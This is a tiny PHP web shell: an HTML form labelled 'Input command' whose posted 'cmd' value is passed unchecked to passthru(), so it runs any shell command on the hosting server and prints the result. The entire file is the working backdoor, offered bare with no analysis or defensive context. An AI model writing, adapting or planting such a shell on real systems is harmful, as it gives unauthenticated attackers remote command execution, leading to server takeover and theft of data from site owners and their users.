<html>
<div align="left"><font size="2">Input command :</font></div>
<form name="cmd" method="POST" enctype="multipart/form.data">
<input type="text" name="cmd" size="30" class="input"><br>
<pre>
<?php
if ($_POST['cmd']){
	$cmd = $_POST['cmd'];
    passthru($cmd);
}
?>
</html>
